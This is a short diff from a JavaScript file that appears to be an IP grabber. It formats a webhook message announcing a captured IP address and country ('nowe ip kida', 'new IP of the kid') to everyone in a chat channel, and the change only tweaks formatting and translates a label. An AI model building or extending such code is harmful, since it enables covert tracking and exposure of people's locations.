@@ -24,8 +24,8 @@ const request = async () => { // Calling a "synchronous" fetch
         avatar_url: "",
         content:    "**nowe ip kida** @everyone \n" + 
 		    "__**:globe_with_meridians: IP Address:**__ \n" +
-                    "`" + ip + "` \n \n" +
-		    "__**Country:**__ \n" +
+                    "`" + ip + "` \n" +
+		    "__**Kraj:**__ \n" +
 		    "`" + country + "`"
     }
 
